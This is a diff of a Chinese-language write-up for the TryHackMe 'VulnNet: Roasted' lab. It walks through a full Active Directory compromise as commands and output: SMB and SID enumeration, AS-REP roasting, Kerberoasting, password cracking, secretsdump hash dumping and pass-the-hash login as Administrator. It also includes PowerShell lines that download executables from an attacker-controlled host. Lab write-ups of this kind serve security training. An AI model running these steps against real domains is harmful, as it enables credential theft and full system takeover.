@@ -6,14 +6,14 @@
 
 ```
 ┌──(root💀kali)-[~/tryhackme/Roasted]
-└─# nmap -sV -Pn 10.10.73.56 -p-
+└─# nmap -sV -Pn 10.10.33.36 -p-
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-18 01:20 EST
 Stats: 0:07:50 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
 Service scan Timing: About 70.00% done; ETC: 01:29 (0:00:15 remaining)
 Stats: 0:07:58 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
 Service scan Timing: About 70.00% done; ETC: 01:29 (0:00:18 remaining)
-Nmap scan report for 10.10.73.56
+Nmap scan report for 10.10.33.36
 Host is up (0.31s latency).
 Not shown: 65515 filtered ports
 PORT      STATE SERVICE       VERSION
@@ -52,8 +52,8 @@ enum4linux枚举没有发现
 
 ```
 ┌──(root💀kali)-[~/tryhackme/Roasted]
-└─# smbmap -H 10.10.73.56 -u anonymous                                                                                                                                                                                                  1 ⨯
-[+] Guest session       IP: 10.10.73.56:445     Name: 10.10.73.56                                       
+└─# smbmap -H 10.10.33.36 -u anonymous                                                                                                                                                                                                  1 ⨯
+[+] Guest session       IP: 10.10.33.36:445     Name: 10.10.33.36                                       
         Disk                                                    Permissions     Comment
         ----                                                    -----------     -------
         ADMIN$                                                  NO ACCESS       Remote Admin
@@ -69,7 +69,7 @@ enum4linux枚举没有发现
 VulnNet-Business-Anonymous
 ```
 ┌──(root💀kali)-[~/tryhackme/Roasted]
-└─# smbclient  //10.10.73.56/VulnNet-Business-Anonymous                                                                                                                                                                                 1 ⨯
+└─# smbclient  //10.10.33.36/VulnNet-Business-Anonymous                                                                                                                                                                                 1 ⨯
 Enter WORKGROUP\root's password: 
 Try "help" to get a list of possible commands.
 smb: \> ls
@@ -86,7 +86,7 @@ smb: \> ls
 VulnNet-Enterprise-Anonymous 
 ```
 ┌──(root💀kali)-[~/tryhackme/Roasted]
-└─# smbclient  //10.10.73.56/VulnNet-Enterprise-Anonymous                                                                                                                                                                             130 ⨯
+└─# smbclient  //10.10.33.36/VulnNet-Enterprise-Anonymous                                                                                                                                                                             130 ⨯
 Enter WORKGROUP\root's password: 
 Try "help" to get a list of possible commands.
 smb: \> ls
@@ -98,16 +98,16 @@ smb: \> ls
 ```
 文件下载到本地分析，可惜没有什么有用的东西
 
-用```Impacket```枚举用户名
+## 用```Impacket```枚举用户名
 
 ```
 ┌──(root💀kali)-[~/tryhackme/Roasted]
-└─# python3 /opt/impacket/examples/lookupsid.py anonymous@10.10.73.56
+└─# python3 /opt/impacket/examples/lookupsid.py anonymous@10.10.33.36
 Impacket v0.9.24.dev1+20210906.175840.50c76958 - Copyright 2021 SecureAuth Corporation
 
 Password:
-[*] Brute forcing SIDs at 10.10.73.56
-[*] StringBinding ncacn_np:10.10.73.56[\pipe\lsarpc]
+[*] Brute forcing SIDs at 10.10.33.36
+[*] StringBinding ncacn_np:10.10.33.36[\pipe\lsarpc]
 [*] Domain SID is: S-1-5-21-1589833671-435344116-4136949213
 498: VULNNET-RST\Enterprise Read-only Domain Controllers (SidTypeGroup)
 500: VULNNET-RST\Administrator (SidTypeUser)
@@ -156,12 +156,12 @@ j-leet
 
 我们保存到user.txt
 
-
-枚举上面名单里面的哈希值：
+因为88端口运行了Kerberos，所以我们可以利用它来获得可能泄露的哈希。
+## 枚举名单里面的哈希值：
 
 ```
 ┌──(root💀kali)-[~/tryhackme/Roasted]
-└─# python3 /opt/impacket/examples/GetNPUsers.py 'VULNNET-RST/' -usersfile user.txt -no-pass -dc-ip 10.10.73.56 
+└─# python3 /opt/impacket/examples/GetNPUsers.py 'VULNNET-RST/' -usersfile user.txt -no-pass -dc-ip 10.10.33.36 
 Impacket v0.9.24.dev1+20210906.175840.50c76958 - Copyright 2021 SecureAuth Corporation
 
 [-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
@@ -178,7 +178,7 @@ $krb5asrep$23$t-skid@VULNNET-RST:f20c16f548ddfd2ac7319c9704bae283$9738ca133868bf
 
 把上面枚举出来的哈希值保存到文件hash.txt
 
-用```name-that-hash```识别哈希类型
+## 用```name-that-hash```识别哈希类型
 
 ```
 ┌──(root💀kali)-[~/tryhackme/Roasted]
@@ -222,10 +222,10 @@ Session completed
 得到密码：```tj072889*```
 
 
-用上面的密码导出keberoast的哈希到```keberoast.hash```:
+## 用上面的密码导出keberoast的哈希到```keberoast.hash```:
 ```
 ┌──(root💀kali)-[~/tryhackme/Roasted]
-└─# python3 /opt/impacket/examples/GetUserSPNs.py 'VULNNET-RST.local/t-skid:tj072889*' -outputfile keberoast.hash -dc-ip 10.10.73.56
+└─# python3 /opt/impacket/examples/GetUserSPNs.py 'VULNNET-RST.local/t-skid:tj072889*' -outputfile keberoast.hash -dc-ip 10.10.33.36
 
 Impacket v0.9.24.dev1+20210906.175840.50c76958 - Copyright 2021 SecureAuth Corporation
 
@@ -244,7 +244,7 @@ $krb5tgs$23$*enterprise-core-vn$VULNNET-RST.LOCAL$VULNNET-RST.local/enterprise-c
 
 ```
 
-再次识别哈希类型：
+## 再次识别哈希类型：
 ```
 ┌──(root💀kali)-[~/tryhackme/Roasted]
 └─#  name-that-hash -f keberoast.hash                                                                                                                                                                                                 130 ⨯
@@ -264,7 +264,7 @@ Kerberos 5 TGS-REP etype 23, HC: 13100 JtR: krb5tgs Summary: Used in Windows Act
 
 ```
 
-再次用john破解这个哈希
+## 再次用john破解这个哈希
 ```
 ┌──(root💀kali)-[~/tryhackme/Roasted]
 └─# john --wordlist=/usr/share/wordlists/rockyou.txt keberoast.hash 
@@ -279,11 +279,11 @@ Session completed
 ```
 得到密码：```ry=ibfkfv,s6h,```
 
-用evil-winrm登录，拿到初始shell：
+# 用evil-winrm登录，拿到初始shell：
 
 ```
 ┌──(root💀kali)-[~/tryhackme/Roasted]
-└─# evil-winrm -u 'enterprise-core-vn' -p 'ry=ibfkfv,s6h,' -i 10.10.73.56
+└─# evil-winrm -u 'enterprise-core-vn' -p 'ry=ibfkfv,s6h,' -i 10.10.33.36
 
 Evil-WinRM shell v3.2
 
@@ -321,7 +321,172 @@ Mode                LastWriteTime         Length Name
 *Evil-WinRM* PS C:\Users\enterprise-core-vn\Desktop> get-content user.txt
 
 ```
+# 提权
+传winpen：
+```
+powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.13.21.169:8000/shell.exe','C:\Users\enterprise-core-vn\Desktop\shell.exe')"
+```
+
+开始枚举提权漏洞：
+```
+*Evil-WinRM* PS C:\Users\enterprise-core-vn\desktop> Start-Process C:\Users\enterprise-core-vn\desktop\winPEASx64.exe
+This command cannot be run due to the error: Operation did not complete successfully because the file contains a virus or potentially unwanted software.
+At line:1 char:1
+
+```
+
+可能存在某种防病毒软件，我们的winpea不能正常执行。
+
+我们现在已经有了```enterprise-core-vn```的登录凭证，可以用来再次枚举共享文件夹的登入权限
+
+```
+┌──(root💀kali)-[~/tryhackme/Roasted]
+└─# smbmap -H 10.10.33.36 -u 'enterprise-core-vn' -p 'ry=ibfkfv,s6h,'                                                                                                                                                                 2 ⨯
+[+] IP: 10.10.33.36:445       Name: 10.10.33.36                                     
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        ADMIN$                                                  NO ACCESS       Remote Admin
+        C$                                                      NO ACCESS       Default share
+        IPC$                                                    READ ONLY       Remote IPC
+        NETLOGON                                                READ ONLY       Logon server share 
+        SYSVOL                                                  READ ONLY       Logon server share 
+        VulnNet-Business-Anonymous                              READ ONLY       VulnNet Business Sharing
+        VulnNet-Enterprise-Anonymous                            READ ONLY       VulnNet Enterprise Sharing
+
+```
+
+可以看到，我们现在对```NETLOGON```和```SYSVOL```也有了读权限
+我们登陆```SYSVOL```
+
+```
+┌──(root💀kali)-[~/tryhackme/Roasted]
+└─# smbclient //10.10.33.36/SYSVOL -U enterprise-core-vn%ry=ibfkfv,s6h,                                                                                                                                                             130 ⨯
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Thu Mar 11 14:19:49 2021
+  ..                                  D        0  Thu Mar 11 14:19:49 2021
+  vulnnet-rst.local                  Dr        0  Thu Mar 11 14:19:49 2021
+cd 
+                8771839 blocks of size 4096. 4532836 blocks available
+smb: \> cd vulnnet-rst.local
+smb: \vulnnet-rst.local\> ls
+  .                                   D        0  Thu Mar 11 14:23:40 2021
+  ..                                  D        0  Thu Mar 11 14:23:40 2021
+  DfsrPrivate                      DHSr        0  Thu Mar 11 14:23:40 2021
+  Policies                            D        0  Thu Mar 11 14:20:26 2021
+  scripts                             D        0  Tue Mar 16 19:15:49 2021
+
+                8771839 blocks of size 4096. 4532836 blocks available
+smb: \vulnnet-rst.local\> cd scripts
+smb: \vulnnet-rst.local\scripts\> ls
+  .                                   D        0  Tue Mar 16 19:15:49 2021
+  ..                                  D        0  Tue Mar 16 19:15:49 2021
+  ResetPassword.vbs                   A     2821  Tue Mar 16 19:18:14 2021
+
+                8771839 blocks of size 4096. 4532836 blocks available
+smb: \vulnnet-rst.local\scripts\> get ResetPassword.vbs 
+getting file \vulnnet-rst.local\scripts\ResetPassword.vbs of size 2821 as ResetPassword.vbs (1.1 KiloBytes/sec) (average 1.1 KiloBytes/sec)
+
+```
+
+## 下载```scripts```文件夹下的```ResetPassword.vbs```文件
 
 
+打开这个文件，又找到了另一个登录凭证：
+```
+┌──(root💀kali)-[~/tryhackme/Roasted]
+└─# cat ResetPassword.vbs                                 
+Option Explicit
 
-powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.13.21.169:8000/nc.exe','C:\Users\enterprise-core-vn\Desktop\nc.exe')"
+Dim objRootDSE, strDNSDomain, objTrans, strNetBIOSDomain
+Dim strUserDN, objUser, strPassword, strUserNTName
+
+' Constants for the NameTranslate object.
+Const ADS_NAME_INITTYPE_GC = 3
+Const ADS_NAME_TYPE_NT4 = 3
+Const ADS_NAME_TYPE_1779 = 1
+
+If (Wscript.Arguments.Count <> 0) Then
+    Wscript.Echo "Syntax Error. Correct syntax is:"
+    Wscript.Echo "cscript ResetPassword.vbs"
+    Wscript.Quit
+End If
+
+strUserNTName = "a-whitehat"
+strPassword = "bNdKVkjv3RR9ht"
+
+```
+
+## 用得到的凭证，我们再次列出samba可以登录的共享文件夹:
+
+
+```
+┌──(root💀kali)-[~/tryhackme/Roasted]
+└─# smbmap -H 10.10.33.36 -u 'a-whitehat' -p 'bNdKVkjv3RR9ht'                                                                                                                                                                       130 ⨯
+[+] IP: 10.10.33.36:445       Name: 10.10.33.36                                     
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        ADMIN$                                                  READ, WRITE     Remote Admin
+        C$                                                      READ, WRITE     Default share
+        IPC$                                                    READ ONLY       Remote IPC
+        NETLOGON                                                NO ACCESS       Logon server share 
+        SYSVOL                                                  NO ACCESS       Logon server share 
+        VulnNet-Business-Anonymous                              NO ACCESS       VulnNet Business Sharing
+        VulnNet-Enterprise-Anonymous                            NO ACCESS       VulnNet Enterprise Sharing
+
+```
+
+
+这次我们甚至对admin有了读写权限。
+
+## 我们用脚本导出所有哈希（hashdump）：
+```
+┌──(root💀kali)-[~/tryhackme/Roasted]
+└─# python3 /opt/impacket/examples/secretsdump.py VULNNET-RST.local/a-whitehat:bNdKVkjv3RR9ht@10.10.33.36
+Impacket v0.9.24.dev1+20210906.175840.50c76958 - Copyright 2021 SecureAuth Corporation
+
+[*] Target system bootKey: 0xf10a2788aef5f622149a41b2c745f49a
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:c2597747aa5e43022a3a3049a3c3b09d:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+
+```
+## 拿到system.txt
+上面得到的哈希无需破解，直接登录```Administrator```账号
+```
+┌──(root💀kali)-[~/tryhackme/Roasted]
+└─# evil-winrm -i 10.10.33.36 -u Administrator -H c2597747aa5e43022a3a3049a3c3b09d                                                                                                                                                      1 ⨯
+
+Evil-WinRM shell v3.2
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents> 
+*Evil-WinRM* PS C:\Users\Administrator> cd desktop
+*Evil-WinRM* PS C:\Users\Administrator\desktop> ls
+
+
+    Directory: C:\Users\Administrator\desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        3/13/2021   3:34 PM             39 system.txt
+
+
+*Evil-WinRM* PS C:\Users\Administrator\desktop> get-content system.txt
+```
+
+# 总结
+1. 我们从anonymous账号是否能登陆共享文件夹作为攻击的立足点。
+2. 然后用```/opt/impacket/examples/lookupsid.py```脚本枚举了在windows上的用户名
+3. 根据用户名单，针对```Kerberos```服务，我们利用```/opt/impacket/examples/GetNPUsers.py```脚本又导出了可能的用户哈希，这个是比较重要的一点，我们利用```evil-winrm```得到了一个初始shell，但是因为系统本身可能存在某种反病毒软件，我们不能执行winpea。
+4. 继续用新得到的用户凭证，利用```smbmap```得到了更多共享文件夹的登入权限。
+5. 在某个配置文件里（文件配置泄露漏洞），我们又得到了一个更高权限的用户凭证。
+6. 依靠高权限用户，直接导出了Administrator的哈希，至此我们得到了系统的最高权限。
+
